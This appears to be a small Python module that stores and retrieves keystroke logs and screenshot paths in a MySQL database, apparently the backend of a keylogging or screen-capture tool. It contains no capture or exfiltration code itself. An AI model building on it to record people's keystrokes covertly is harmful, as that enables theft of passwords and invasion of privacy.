import pymysql
import os

def connect():
    return pymysql.connect(
        host=os.getenv("DB_HOST"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASS"),
        database=os.getenv("DB_NAME"),
        cursorclass=pymysql.cursors.DictCursor
    )

def store_keylog(key):
    """Store keylogs in database."""
    conn = connect()
    with conn.cursor() as cursor:
        cursor.execute("INSERT INTO keylogs (key) VALUES (%s)", (key,))
    conn.commit()
    conn.close()

def get_logs():
    """Retrieve keylogs from database."""
    conn = connect()
    with conn.cursor() as cursor:
        cursor.execute("SELECT * FROM keylogs")
        logs = cursor.fetchall()
    conn.close()
    return logs

def store_screenshot(path):
    """Store screenshot path in database."""
    conn = connect()
    with conn.cursor() as cursor:
        cursor.execute("INSERT INTO screenshots (path) VALUES (%s)", (path,))
    conn.commit()
    conn.close()
